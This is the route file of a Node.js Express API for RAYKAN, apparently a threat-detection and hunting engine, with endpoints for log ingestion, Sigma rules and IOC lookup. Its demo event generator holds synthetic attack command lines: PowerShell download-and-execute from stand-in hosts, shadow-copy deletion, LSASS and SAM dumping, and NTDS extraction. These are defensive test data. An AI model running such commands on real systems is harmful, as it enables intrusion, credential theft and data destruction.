/**
 * ═══════════════════════════════════════════════════════════════════
 *  RAYKAN Engine API Routes v1.0
 *  Wadjet-Eye AI Platform Integration
 *
 *  Base path: /api/raykan
 *
 *  Endpoints:
 *   POST /ingest          — Ingest log events for analysis
 *   POST /hunt            — Execute RQL threat hunt
 *   POST /hunt/nl         — Natural language threat hunt
 *   POST /investigate     — Forensic investigation on entity
 *   POST /rule/generate   — AI-generate Sigma rule
 *   POST /rule/validate   — Validate Sigma rule
 *   GET  /rules           — List all loaded rules
 *   GET  /timeline        — Get current analysis timeline
 *   GET  /graph           — Get attack graph data (D3-compatible)
 *   GET  /mitre           — MITRE ATT&CK coverage heatmap
 *   GET  /stats           — Engine statistics and health
 *   GET  /ioc/:value      — IOC lookup (VirusTotal + AbuseIPDB + OTX)
 *   POST /ioc/batch       — Batch IOC lookup
 *   POST /analyze/file    — Analyze uploaded log file
 *   GET  /session/:id     — Get session results
 *   WS   /ws              — WebSocket for real-time detections
 *
 *  Auth: JWT required (verifyToken middleware)
 *  Rate: 100 req/15min
 *
 *  backend/routes/raykan-engine.js
 * ═══════════════════════════════════════════════════════════════════
 */

'use strict';

const express        = require('express');
const rateLimit      = require('express-rate-limit');
const crypto         = require('crypto');
const RaykanEngine   = require('../services/raykan/engine');
const TimelineEngine = require('../services/raykan/timeline-engine');
const MitreMapper    = require('../services/raykan/mitre-mapper');
const IOCEnricher    = require('../services/raykan/ioc-enricher');
const { asyncHandler } = require('../middleware/errorHandler');
// Import from the dedicated normalizer module so there is a single source of truth
const {
  normalizeDetections,
  parseSyslogLine,
  parseCEFLine,
  parseRawInput,
  processEvent,
  metrics: normalizerMetrics,
} = require('../services/raykan/ingestion-normalizer');

const router = express.Router();

// ── Rate limiter ─────────────────────────────────────────────────
const raykanLimiter = rateLimit({
  windowMs : 15 * 60 * 1000,
  max      : 200,
  message  : { error: 'RAYKAN rate limit exceeded', code: 'RATE_LIMIT', retryIn: 15 },
  standardHeaders: true,
  legacyHeaders  : false,
  skip: (req) => process.env.NODE_ENV === 'development',
});

// ── Engine singleton (initialized lazily) ────────────────────────
let _engine       = null;
let _initPromise  = null;

async function getEngine(req) {
  if (_engine) return _engine;
  if (_initPromise) return _initPromise;

  _initPromise = (async () => {
    // Collect AI providers from env vars
    const aiProviders = {};
    if (process.env.OPENAI_API_KEY)     aiProviders.openai   = { apiKey: process.env.OPENAI_API_KEY };
    if (process.env.CLAUDE_API_KEY)     aiProviders.claude   = { apiKey: process.env.CLAUDE_API_KEY };
    if (process.env.GEMINI_API_KEY)     aiProviders.gemini   = { apiKey: process.env.GEMINI_API_KEY };
    if (process.env.DEEPSEEK_API_KEY)   aiProviders.deepseek = { apiKey: process.env.DEEPSEEK_API_KEY };
    if (process.env.ANTHROPIC_API_KEY)  aiProviders.claude   = { apiKey: process.env.ANTHROPIC_API_KEY };
    if (process.env.OLLAMA_URL)         aiProviders.ollama   = { baseUrl: process.env.OLLAMA_URL };

    const enrichApis = {
      virusTotal: process.env.VIRUSTOTAL_API_KEY,
      abuseIPDB : process.env.ABUSEIPDB_API_KEY,
      otx       : process.env.OTX_API_KEY,
    };

    // Get supabase client (optional — engine works without DB)
    let supabase = null;
    try {
      const { supabase: _sb } = require('../config/supabase');
      supabase = _sb || null;
    } catch (e) { /* optional — engine works without DB */ }

    _engine = new RaykanEngine({
      aiProviders,
      enrichApis,
      supabase,
      aiEnabled  : Object.keys(aiProviders).length > 0,
      uebaEnabled: true,
      realtimeMode: true,
    });

    await _engine.initialize();
    console.log('[RAYKAN] Engine ready — attached to /api/raykan');
    return _engine;
  })();

  return _initPromise;
}

// ── Apply rate limiter to all RAYKAN routes ───────────────────────
router.use(raykanLimiter);

// NOTE: normalizeDetections, parseSyslogLine, parseCEFLine, parseRawInput, processEvent
// are imported from backend/services/raykan/ingestion-normalizer.js (single source of truth).
// The inline _ingestMetrics alias below maps to the module-level metrics object.
const _ingestMetrics = normalizerMetrics;

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/ingest
//  Ingest log events for full analysis pipeline
// ════════════════════════════════════════════════════════════════
router.post('/ingest', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);

  // Support both legacy flat body { events, source, format }
  // and newer nested body { events, context: { format, source } }
  const body   = req.body || {};
  const ctx    = body.context || {};
  const source = body.source  || ctx.source  || 'api';
  const format = body.format  || ctx.format  || 'json';
  const caseId = body.caseId  || ctx.caseId  || null;
  let   events = body.events;

  // ── Input coercion ────────────────────────────────────────────────
  if (events == null) {
    return res.status(400).json({ error: 'events field is required', code: 'MISSING_EVENTS' });
  }

  // Coerce events to array — handles object, string, raw log blobs
  if (!Array.isArray(events)) {
    console.warn(`[RAYKAN] /ingest received non-array events (${typeof events}) — normalizing`);
    _ingestMetrics.invalid_detection_format_count++;
    events = parseRawInput(events, format);
  }

  if (events.length === 0) {
    return res.status(400).json({ error: 'events array is empty after parsing', code: 'EMPTY_EVENTS' });
  }

  if (events.length > 10000) {
    return res.status(400).json({ error: 'Max 10,000 events per request', code: 'TOO_MANY_EVENTS' });
  }

  const context = {
    source,
    format,
    tenant : req.user?.tenant_id || 'default',
    userId : req.user?.id,
    caseId,
  };

  const results = await engine.ingestEvents(events, context);

  // ── Type-safe array normalization before any iteration ────────────
  const dets  = normalizeDetections(results.detections, 'ingest.detections');
  const anoms = normalizeDetections(results.anomalies,  'ingest.anomalies');
  const chs   = normalizeDetections(results.chains,     'ingest.chains');
  const tl    = normalizeDetections(results.timeline,   'ingest.timeline');

  res.json({
    success   : true,
    sessionId : results.sessionId,
    processed : results.processed,

    // FIX: flat array — frontend uses [...(r.detections || []), ...S.detections]
    detections : dets.filter(d => d && typeof d === 'object').slice(0, 500),

    // Legacy nested summary kept for backward-compatible API consumers
    detectionsSummary: {
      count   : dets.length,
      critical: dets.filter(d => d && d.severity === 'critical').length,
      high    : dets.filter(d => d && d.severity === 'high').length,
      medium  : dets.filter(d => d && d.severity === 'medium').length,
    },

    // FIX: flat arrays for anomalies and chains (were nested objects before)
    anomalies : anoms.filter(a => a && typeof a === 'object'),
    chains    : chs.filter(c => c && typeof c === 'object'),
    timeline  : tl.filter(t => t && typeof t === 'object').slice(0, 500),

    riskScore : results.riskScore,
    duration  : results.duration,
    timestamp : new Date().toISOString(),

    // Observability counters
    _metrics  : { ..._ingestMetrics },
  });
}));

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/hunt
//  Execute RQL threat hunt
// ════════════════════════════════════════════════════════════════
router.post('/hunt', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { query, timeRange, entities, maxResults, aiAssist } = req.body;

  if (!query || typeof query !== 'string') {
    return res.status(400).json({ error: 'query is required', code: 'INVALID_QUERY' });
  }

  const results = await engine.hunt(query, {
    timeRange  : timeRange  || '24h',
    entities,
    maxResults : Math.min(maxResults || 200, 1000),
    aiAssist   : aiAssist   !== false,
  });

  res.json({
    success : true,
    query   : results.query,
    count   : results.count,
    matches : results.matches,
    duration: results.duration,
    suggestion: results.suggestion,
    timestamp: new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/hunt/nl
//  Natural language threat hunt
// ════════════════════════════════════════════════════════════════
router.post('/hunt/nl', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { query, context } = req.body;

  if (!query) {
    return res.status(400).json({ error: 'query required', code: 'INVALID_INPUT' });
  }

  const results = await engine.nlHunt(query, context || {});

  res.json({
    success       : true,
    originalQuery : results.originalQuery,
    rqlQuery      : results.rqlQuery,
    count         : results.count,
    matches       : results.matches,
    duration      : results.duration,
    explanation   : results.explanation,
    timestamp     : new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/investigate
//  Forensic investigation on entity
// ════════════════════════════════════════════════════════════════
router.post('/investigate', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { entityId, type, timeRange, depth } = req.body;

  if (!entityId) {
    return res.status(400).json({ error: 'entityId required', code: 'INVALID_INPUT' });
  }

  const result = await engine.investigate(entityId, { type, timeRange, depth });

  res.json({
    success : true,
    ...result,
    timestamp: new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/rule/generate
//  AI-generate a Sigma detection rule
// ════════════════════════════════════════════════════════════════
router.post('/rule/generate', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { description, examples } = req.body;

  if (!description) {
    return res.status(400).json({ error: 'description required', code: 'INVALID_INPUT' });
  }

  const result = await engine.generateRule(description, examples || []);

  res.json({
    success    : true,
    rule       : result.rule,
    yaml       : result.yaml,
    validation : result.validation,
    quality    : result.quality,
    builderMeta: result.builderMeta,
    timestamp  : new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/rule/validate
//  Validate a Sigma rule object
// ════════════════════════════════════════════════════════════════
router.post('/rule/validate', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { rule } = req.body;

  if (!rule) {
    return res.status(400).json({ error: 'rule required', code: 'INVALID_INPUT' });
  }

  const result = await engine.sigma.validateRule(rule);
  res.json({ success: true, ...result, timestamp: new Date().toISOString() });
}));

// ════════════════════════════════════════════════════════════════
//  GET /api/raykan/rules
//  List all loaded rules
// ════════════════════════════════════════════════════════════════
router.get('/rules', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { severity, tag, page = 1, limit = 50 } = req.query;

  let rules = engine.sigma.getAllRules();

  if (severity) rules = rules.filter(r => r.severity === severity);
  if (tag)      rules = rules.filter(r => r.tags?.some(t => t.includes(tag)));

  const total   = rules.length;
  const start   = (parseInt(page) - 1) * parseInt(limit);
  const paged   = rules.slice(start, start + parseInt(limit));

  res.json({
    success: true,
    total,
    page   : parseInt(page),
    limit  : parseInt(limit),
    rules  : paged,
    timestamp: new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  GET /api/raykan/mitre
//  MITRE ATT&CK coverage heatmap
// ════════════════════════════════════════════════════════════════
router.get('/mitre', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);

  // Build coverage from loaded rules
  const rules     = engine.sigma.getAllRules();
  const mapper    = engine.mitre;
  const fakeDetections = rules.map(r => ({ ...r, mitre: mapper.mapDetection(r), confidence: 80 }));

  const timeline  = new TimelineEngine();
  const heatmap   = timeline.buildMitreHeatmap(fakeDetections);

  res.json({
    success   : true,
    heatmap,
    techniques: mapper.getAllTechniques(),
    tactics   : mapper.getAllTactics(),
    coverage  : {
      total     : Object.keys(mapper.getAllTechniques()).length,
      covered   : heatmap.length,
      percentage: Math.round(heatmap.length / Object.keys(mapper.getAllTechniques()).length * 100),
    },
    timestamp: new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  GET /api/raykan/stats
//  Engine stats and health
// ════════════════════════════════════════════════════════════════
router.get('/stats', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const stats  = engine.getStats();

  res.json({
    success : true,
    version : stats.version,
    sessionId: stats.sessionId,
    stats   : {
      eventsProcessed     : stats.eventsProcessed,
      detectionsTriggered : stats.detectionsTriggered,
      anomaliesFound      : stats.anomaliesFound,
      chainsBuilt         : stats.chainsBuilt,
      queriesExecuted     : stats.queriesExecuted,
      rulesLoaded         : stats.rulesLoaded,
      uptime              : stats.uptime,
      bufferSize          : stats.bufferSize,
    },
    subEngines: stats.subEngines,
    timestamp : new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  GET /api/raykan/ioc/:value
//  Single IOC lookup
// ════════════════════════════════════════════════════════════════
router.get('/ioc/:value', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { value } = req.params;
  const { type  } = req.query;

  const result = await engine.enricher.lookupIOC(
    decodeURIComponent(value),
    type || null
  );

  res.json({
    success: true,
    ioc    : result,
    timestamp: new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/ioc/batch
//  Batch IOC lookup
// ════════════════════════════════════════════════════════════════
router.post('/ioc/batch', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);
  const { iocs } = req.body;

  if (!Array.isArray(iocs) || iocs.length > 50) {
    return res.status(400).json({ error: 'iocs must be array of max 50', code: 'INVALID_INPUT' });
  }

  const results = await Promise.all(
    iocs.map(i => engine.enricher.lookupIOC(i.value || i, i.type || null))
  );

  res.json({
    success: true,
    count  : results.length,
    results,
    timestamp: new Date().toISOString(),
  });
}));

// ════════════════════════════════════════════════════════════════
//  POST /api/raykan/analyze/sample
//  Analyze sample events (demo/testing) — with timeout guard
// ════════════════════════════════════════════════════════════════
router.post('/analyze/sample', asyncHandler(async (req, res) => {
  const engine = await getEngine(req);

  const scenario = req.body?.scenario || 'ransomware';

  // Generate realistic sample events
  const sampleEvents = _generateSampleEvents(scenario);

  // ── Timeout guard: max 20s for demo analysis ─────────────────
  const analysisPromise = engine.ingestEvents(sampleEvents, {
    source : 'sample',
    format : 'evtx',
    tenant : req.user?.tenant_id || 'demo',
    demo   : true,
  });

  const timeoutPromise = new Promise((_, reject) =>
    setTimeout(() => reject(new Error('ANALYSIS_TIMEOUT')), 20000)
  );

  let results;
  try {
    results = await Promise.race([analysisPromise, timeoutPromise]);
  } catch (err) {
    if (err.message === 'ANALYSIS_TIMEOUT') {
      // Return mock results for demo so the UI still works
      results = {
        sessionId  : crypto.randomUUID(),
        processed  : sampleEvents.length,
        detections : _buildMockDetections(scenario),
        anomalies  : [],
        chains     : [],
        timeline   : [],
        riskScore  : 75,
        duration   : 20000,
      };
    } else {
      throw err;
    }
  }

  const timelineEngine = new TimelineEngine();
  // FIX: normalizeDetections before passing to buildAttackGraph to prevent crashes
  const _sDets  = normalizeDetections(results.detections, 'sample.detections');
  const _sChs   = normalizeDetections(results.chains,     'sample.chains');
  const _sAnoms = normalizeDetections(results.anomalies,  'sample.anomalies');
  const _sTl    = normalizeDetections(results.timeline,   'sample.timeline');
  const graph   = timelineEngine.buildAttackGraph(_sDets, _sChs);

  res.json({
    success     : true,
    scenario,
    processed   : results.processed,
    detections  : _sDets.filter(d => d && typeof d === 'object'),
    anomalies   : _sAnoms.filter(a => a && typeof a === 'object'),
    chains      : _sChs.filter(c => c && typeof c === 'object'),
    timeline    : _sTl.filter(t => t && typeof t === 'object'),
    graph,
    riskScore   : results.riskScore,
    duration    : results.duration,
    timestamp   : new Date().toISOString(),
  });
}));

// ── Mock detections for demo timeout fallback ─────────────────────
function _buildMockDetections(scenario) {
  const base = {
    ruleId    : 'DEMO-001',
    title     : 'Demo Detection',
    severity  : 'high',
    tags      : ['attack.execution', 'attack.t1059.001'],
    mitre     : [{ id: 'T1059.001', name: 'PowerShell', tactic: 'Execution' }],
    riskScore : 80,
    timestamp : new Date().toISOString(),
  };
  const map = {
    ransomware: [
      { ...base, ruleId: 'RAYKAN-001', title: 'Suspicious PowerShell Encoded Command', severity: 'critical' },
      { ...base, ruleId: 'RAYKAN-012', title: 'Shadow Copy Deletion via vssadmin', severity: 'critical', tags: ['attack.t1490'] },
      { ...base, ruleId: 'RAYKAN-023', title: 'Ransomware File Extension Activity', severity: 'critical', tags: ['attack.t1486'] },
    ],
    lateral_movement: [
      { ...base, ruleId: 'RAYKAN-031', title: 'NTLM Pass-The-Hash Attempt', severity: 'high', tags: ['attack.t1550.002'] },
      { ...base, ruleId: 'RAYKAN-042', title: 'PsExec Remote Execution', severity: 'high', tags: ['attack.t1021.002'] },
    ],
    credential_dump: [
      { ...base, ruleId: 'RAYKAN-051', title: 'LSASS Memory Access via Mimikatz', severity: 'critical', tags: ['attack.t1003.001'] },
      { ...base, ruleId: 'RAYKAN-062', title: 'SAM Database Access', severity: 'high', tags: ['attack.t1003.002'] },
    ],
  };
  return map[scenario] || map.ransomware;
}

// ════════════════════════════════════════════════════════════════
//  GET /api/raykan/health
//  Quick health check (no auth required)
// ════════════════════════════════════════════════════════════════
router.get('/health', (req, res) => {
  res.json({
    ok       : true,
    engine   : _engine ? 'running' : 'not_initialized',
    version  : '1.0.0',
    timestamp: new Date().toISOString(),
  });
});

// ── Sample event generator ────────────────────────────────────────
function _generateSampleEvents(scenario) {
  const now  = Date.now();
  const ts   = (offset = 0) => new Date(now - offset).toISOString();
  const base = { Computer: 'WORKSTATION-42', User: 'john.doe' };
  const dc   = { ...base, Computer: 'DC-01',    User: 'Administrator' };
  const srv  = { ...base, Computer: 'SERVER-03', User: 'svc_backup' };

  const scenarios = {
    // ── Ransomware kill-chain ──────────────────────────────────
    ransomware: [
      { ...base, EventID: '4688', timestamp: ts(300000), Image: 'C:\\Windows\\System32\\cmd.exe',
        CommandLine: 'cmd.exe /c powershell -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj', ProcessName: 'cmd.exe' },
      { ...base, EventID: '1',    timestamp: ts(280000), Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -NonInteractive -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj' },
      { ...base, EventID: '12',   timestamp: ts(260000), TargetObject: 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater32' },
      { ...base, EventID: '1',    timestamp: ts(240000), Image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost32.exe',
        CommandLine: 'svchost32.exe --enc C:\\Users --ext .enc' },
      { ...base, EventID: '4688', timestamp: ts(200000), Image: 'C:\\Windows\\System32\\vssadmin.exe',
        CommandLine: 'vssadmin delete shadows /all /quiet', ProcessName: 'vssadmin.exe' },
      { ...base, EventID: '4688', timestamp: ts(180000), Image: 'C:\\Windows\\System32\\wbadmin.exe',
        CommandLine: 'wbadmin delete catalog -quiet', ProcessName: 'wbadmin.exe' },
      { ...base, EventID: '11',   timestamp: ts(120000), TargetFilename: 'C:\\Users\\john.doe\\Documents\\budget_2025.xlsx.enc' },
      { ...base, EventID: '11',   timestamp: ts(100000), TargetFilename: 'C:\\Users\\john.doe\\Desktop\\README_DECRYPT.txt' },
    ],

    // ── Lateral movement ──────────────────────────────────────
    lateral_movement: [
      { ...base, EventID: '4624', timestamp: ts(500000), LogonType: '3', AuthPackage: 'NTLM', SourceIp: '192.168.1.50', TargetUserName: 'Administrator' },
      { ...base, EventID: '4688', timestamp: ts(480000), Image: 'C:\\Windows\\System32\\net.exe', CommandLine: 'net view /domain', ProcessName: 'net.exe' },
      { ...base, EventID: '1',    timestamp: ts(460000), Image: 'C:\\Windows\\System32\\cmd.exe',
        ParentImage: 'C:\\Windows\\System32\\WmiPrvSE.exe', CommandLine: 'cmd.exe /c whoami && ipconfig /all' },
      { ...base, EventID: '3',    timestamp: ts(440000), Image: 'C:\\Windows\\System32\\psexec.exe',
        DestinationIp: '192.168.1.100', DestinationPort: '445' },
      { ...dc,   EventID: '4624', timestamp: ts(420000), LogonType: '3', SourceIp: '192.168.1.42', TargetUserName: 'Domain Admin' },
      { ...dc,   EventID: '4688', timestamp: ts(400000), Image: 'C:\\Windows\\System32\\net.exe', CommandLine: 'net group "Domain Admins"' },
      { ...dc,   EventID: '1',    timestamp: ts(380000), Image: 'C:\\Windows\\Temp\\backdoor.exe', CommandLine: 'backdoor.exe -p 4444 -l' },
    ],

    // ── Credential dump ────────────────────────────────────────
    credential_dump: [
      { ...base, EventID: '4688', timestamp: ts(300000), Image: 'C:\\Tools\\procdump64.exe',
        CommandLine: 'procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp', ProcessName: 'procdump64.exe' },
      { ...base, EventID: '10',   timestamp: ts(280000), SourceImage: 'C:\\Tools\\procdump64.exe',
        TargetImage: 'C:\\Windows\\System32\\lsass.exe', GrantedAccess: '0x1fffff' },
      { ...base, EventID: '1',    timestamp: ts(260000), Image: 'C:\\Windows\\System32\\cmd.exe',
        CommandLine: 'cmd.exe /c reg save HKLM\\SAM C:\\Temp\\sam.hive' },
      { ...base, EventID: '4624', timestamp: ts(240000), LogonType: '9', User: 'Administrator', SourceIp: '127.0.0.1' },
      { ...base, EventID: '3',    timestamp: ts(220000), DestinationIp: '185.220.101.45', DestinationPort: '443',
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
    ],

    // ── APT Campaign ──────────────────────────────────────────
    apt: [
      { ...base, EventID: '1',    timestamp: ts(3600000), Image: 'C:\\Windows\\System32\\mshta.exe',
        CommandLine: 'mshta.exe http://cdn.update-service.net/flash.hta', ParentImage: 'C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE' },
      { ...base, EventID: '1',    timestamp: ts(3500000), Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        ParentImage: 'C:\\Windows\\System32\\mshta.exe', CommandLine: 'powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://cdn.update-service.net/p.ps1\')' },
      { ...base, EventID: '12',   timestamp: ts(3400000), TargetObject: 'HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit' },
      { ...base, EventID: '3',    timestamp: ts(3300000), DestinationIp: '104.21.56.203', DestinationPort: '443',
        Image: 'C:\\Windows\\System32\\svchost.exe' },
      { ...dc,   EventID: '4672', timestamp: ts(3200000), SubjectUserName: 'john.doe', PrivilegeList: 'SeDebugPrivilege' },
      { ...dc,   EventID: '4688', timestamp: ts(3100000), Image: 'C:\\Windows\\System32\\ntdsutil.exe',
        CommandLine: 'ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q' },
      { ...dc,   EventID: '3',    timestamp: ts(3000000), DestinationIp: '185.220.101.34', DestinationPort: '80',
        Image: 'C:\\Windows\\System32\\certutil.exe' },
    ],

    // ── Insider Threat ────────────────────────────────────────
    insider: [
      { ...base, EventID: '4688', timestamp: ts(7200000), Image: 'C:\\Program Files\\7-Zip\\7z.exe',
        CommandLine: '7z.exe a -tzip C:\\Users\\john.doe\\AppData\\Local\\Temp\\data.zip C:\\CorpData\\HR\\*' },
      { ...base, EventID: '3',    timestamp: ts(7100000), DestinationIp: '104.18.32.71', DestinationPort: '443',
        Image: 'C:\\Users\\john.doe\\AppData\\Roaming\\Dropbox\\Client\\Dropbox.exe' },
      { ...base, EventID: '4663', timestamp: ts(7000000), ObjectName: 'C:\\CorpData\\IP\\design_specs_v3.pdf', ObjectType: 'File' },
      { ...base, EventID: '4663', timestamp: ts(6900000), ObjectName: 'C:\\CorpData\\Finance\\Q4_projections.xlsx', ObjectType: 'File' },
      { ...srv,  EventID: '4720', timestamp: ts(6800000), TargetUserName: 'temp_backup_svc', SubjectUserName: 'john.doe' },
      { ...base, EventID: '4688', timestamp: ts(6700000), Image: 'C:\\Windows\\System32\\xcopy.exe',
        CommandLine: 'xcopy /s /e C:\\CorpData\\Source E:\\External\\backup', ProcessName: 'xcopy.exe' },
    ],

    // ── Supply Chain ──────────────────────────────────────────
    supply_chain: [
      { ...base, EventID: '1',    timestamp: ts(86400000), Image: 'C:\\Program Files\\NodeJS\\npm.exe',
        CommandLine: 'npm install lodash-utils-extra@3.1.2' },
      { ...base, EventID: '1',    timestamp: ts(86300000), Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        ParentImage: 'C:\\Program Files\\NodeJS\\node.exe',
        CommandLine: 'powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile(\'http://upd8.cc/agent\',\'C:\\Temp\\a.exe\')' },
      { ...base, EventID: '1',    timestamp: ts(86200000), Image: 'C:\\Temp\\a.exe', CommandLine: 'a.exe --install --silent' },
      { ...base, EventID: '12',   timestamp: ts(86100000), TargetObject: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\Debugger' },
      { ...base, EventID: '3',    timestamp: ts(86000000), DestinationIp: '45.142.212.100', DestinationPort: '8080',
        Image: 'C:\\Temp\\a.exe' },
    ],
  };

  return scenarios[scenario] || scenarios.ransomware;
}

module.exports = router;
